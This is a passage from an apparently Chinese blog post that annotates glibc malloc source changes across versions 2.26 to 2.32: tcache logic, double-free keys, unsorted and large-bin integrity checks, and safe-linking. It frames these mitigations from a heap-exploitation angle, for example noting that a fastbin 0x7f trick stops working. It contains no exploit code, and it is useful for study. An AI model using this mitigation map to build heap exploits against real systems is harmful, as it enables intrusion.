class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123;<br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>     &amp;&amp; (tc_victim = last (bin)) != bin)<br>&#123;<br>  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>    &#123;<br>      bck = tc_victim-&gt;bk;<br>      set_inuse_bit_at_offset (tc_victim, nb);<br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (tc_victim);<br>      bin-&gt;bk = bck;<br>      bck-&gt;fd = bin;<br><br>      tcache_put (tc_victim, tc_idx);<br>            &#125;<br>&#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="for-大循环之前"><a href="#for-大循环之前" class="headerlink" title="for(;;)大循环之前"></a>for(;;)大循环之前</h4><p>相关参量计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    tcache_nb = nb;<br>  <span class="hljs-type">int</span> return_cached = <span class="hljs-number">0</span>;<br><br>  tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h4 id="unsorted-bin中遍历寻找相同大小chunk时"><a href="#unsorted-bin中遍历寻找相同大小chunk时" class="headerlink" title="unsorted bin中遍历寻找相同大小chunk时"></a>unsorted bin中遍历寻找相同大小chunk时</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (victim);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* Fill cache first, return to user only if cache fills.</span><br><span class="hljs-comment"> We may return one of these chunks later.  */</span><br>      <span class="hljs-keyword">if</span> (tcache_nb<br>  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br><span class="hljs-comment">//tcache没满就先将符合的chunk放进tcache，此时chunk已摘下</span><br><span class="hljs-comment">//可能暂时不会返回</span><br>&#123;<br>  tcache_put (victim, tc_idx);<br>  return_cached = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            &#125;<br></code></pre></td></tr></table></figure><h4 id="unsorted-bin遍历末尾"><a href="#unsorted-bin遍历末尾" class="headerlink" title="unsorted bin遍历末尾"></a>unsorted bin遍历末尾</h4><p>tcache有可返回的chunk则返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment"> filling the cache, return one of the cached ones.  */</span><br>      ++tcache_unsorted_count;<br>      <span class="hljs-keyword">if</span> (return_cached<br>  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span><br>  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>&#123;<br>  <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;    <br></code></pre></td></tr></table></figure><h4 id="unsorted-bin循环结束后"><a href="#unsorted-bin循环结束后" class="headerlink" title="unsorted bin循环结束后"></a>unsorted bin循环结束后</h4><p>tcache有可返回的chunk则返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* If all the small chunks we found ended up cached, return one now.  */</span><br>      <span class="hljs-keyword">if</span> (return_cached)<br>&#123;<br>  <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h3 id="int-free函数变化"><a href="#int-free函数变化" class="headerlink" title="_int_free函数变化"></a>_int_free函数变化</h3><p>两个检查之后，如果tcache有符合的chunk就返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br><br>    <span class="hljs-keyword">if</span> (tcache<br>&amp;&amp; tc_idx &lt; mp_.tcache_bins<br>&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>      &#123;<br>tcache_put (p, tc_idx);<br><span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="unlink开头增加检查"><a href="#unlink开头增加检查" class="headerlink" title="unlink开头增加检查"></a>unlink开头增加检查</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta"><span class="hljs-comment">//size和next chunk的presize的检查</span></span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \<br>    FD = P-&gt;fd;      \<br>    BK = P-&gt;bk;      \<br><br>……<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h1><ul><li>checked_request2size更新<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Same, except also perform an argument and result check.  First, we check</span><br><span class="hljs-comment">   that the padding done by request2size didn&#x27;t result in an integer</span><br><span class="hljs-comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span><br><span class="hljs-comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span><br><span class="hljs-comment">   overflow.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz) \</span><br><span class="hljs-meta">(&#123;    \</span><br><span class="hljs-meta">  (sz) = request2size (req);    \</span><br><span class="hljs-meta">  <span class="hljs-keyword">if</span> (((sz) &lt; (req))    \</span><br><span class="hljs-meta">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="hljs-meta">    &#123;    \</span><br><span class="hljs-meta">      __set_errno (ENOMEM);    \</span><br><span class="hljs-meta">      return 0;    \</span><br><span class="hljs-meta">    &#125;    \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure></li><li>get_max_fast更新<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">get_max_fast (<span class="hljs-type">void</span>)<br>&#123;<br>  <span class="hljs-comment">/* Tell the GCC optimizers that global_max_fast is never larger</span><br><span class="hljs-comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span><br><span class="hljs-comment">     _int_malloc after constant propagation of the size parameter.</span><br><span class="hljs-comment">     (The code never executes because malloc preserves the</span><br><span class="hljs-comment">     global_max_fast invariant, but the optimizers may not recognize</span><br><span class="hljs-comment">     this.)  */</span><br>  <span class="hljs-keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)<br>    __builtin_unreachable ();<br>  <span class="hljs-keyword">return</span> global_max_fast;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>malloc_state增加have_fastchunks<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-type">int</span> have_fastchunks;<br><br>……<br><br>&#125;;<br></code></pre></td></tr></table></figure></li><li>__libc_malloc开头，request2size更换为更安全的checked_request2size<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-type">size_t</span> tbytes;<br>  checked_request2size (bytes, tbytes);<br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<br></code></pre></td></tr></table></figure></li><li>malloc_consolidate的每条fastbin链遍历开头检查chunk大小是否正确<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index (chunksize (p));<br>  <span class="hljs-keyword">if</span> ((&amp;fastbin (av, idx)) != fb)<br>    malloc_printerr (<span class="hljs-string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="2-28"><a href="#2-28" class="headerlink" title="2.28"></a>2.28</h1><ul><li>_int_malloc中整理unsorted bin摘除chunk时增加检查chunk的连接<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure></li></ul><h1 id="2-29"><a href="#2-29" class="headerlink" title="2.29"></a>2.29</h1><ul><li>tcache_entry增加key成员检查tcache的double free<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure></li><li>tcache_put和tcache_get关于key成员的变化<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">tcache_put (mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<span class="hljs-comment">//标记已在tcache中</span><br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//标记已不在tcache中</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>_int_malloc函数中for(;;)大循环中unsorted bin遍历开头检查增加。检查size和nextchunk的presize是否相符；大小是否合法；前后连接是否正确；通过nextchunk的preinuse检查chunk是否inuse<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = victim-&gt;bk;<br>size = chunksize (victim);<br>mchunkptr next = chunk_at_offset (victim, size);<br><br><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (size &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure></li><li>use_top中检查top chunk大小是否合法<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br><br>  victim = av-&gt;top;<br>  size = chunksize (victim);<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure></li><li>_int_free开头的tcache操作，增加double free的检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br><span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>tcache_entry *e = (tcache_entry *) chunk2mem (p);<br><br><span class="hljs-comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="hljs-comment">   trust it (it also matches random payload data at a 1 in</span><br><span class="hljs-comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="hljs-comment">   coincidence before aborting.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>    <span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">       few cycles, but don&#x27;t abort.  */</span><br>  &#125;<br><br><span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>  &#123;<br>    tcache_put (p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li>_int_free的向下合并操作增加size和nextchunk的presize的检查，malloc_consolidate同<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  prevsize = prev_size (p);<br>  size += prevsize;<br>  p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="2-30"><a href="#2-30" class="headerlink" title="2.30"></a>2.30</h1><ul><li>checked_request2size再次更新<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">checked_request2size (<span class="hljs-type">size_t</span> req, <span class="hljs-type">size_t</span> *sz) __nonnull (<span class="hljs-number">1</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  *sz = request2size (req);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>tcache_put和tcache_get的断言全部删除</li><li>__libc_malloc中从tcache中取chunk时按counts决定tcache是否非空<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>    &amp;&amp; tcache<br>    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>  &#125;<br></code></pre></td></tr></table></figure></li><li>_int_malloc中将chunk放入large bin中时增加检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>  &#123;<br>    victim-&gt;fd_nextsize = fwd;<br>    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>      malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br>    fwd-&gt;bk_nextsize = victim;<br>    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>  &#125;<br>bck = fwd-&gt;bk;<br><span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br><br></code></pre></td></tr></table></figure></li></ul><h1 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h1><p>无</p><h1 id="2-32"><a href="#2-32" class="headerlink" title="2.32"></a>2.32</h1><ul><li>增加了对单链表的指针保护机制safe-linking（fastbin和tcache）和对申请地址的0x10对齐检查（错位找0x7f打fastbin不行了&#x2F;(ㄒoㄒ)&#x2F;~~）<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  e-&gt;key = tcache;<br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br><span class="hljs-comment">//原fd^地址&gt;&gt;12</span><br><span class="hljs-comment">//e-&gt;next = tcache-&gt;entries[tc_idx];（2.31源码）</span><br><br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br><span class="hljs-comment">//从tcache中取chunk时的对齐检查，从fastbin中取chunk的对齐检查同理</span><br><br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br><span 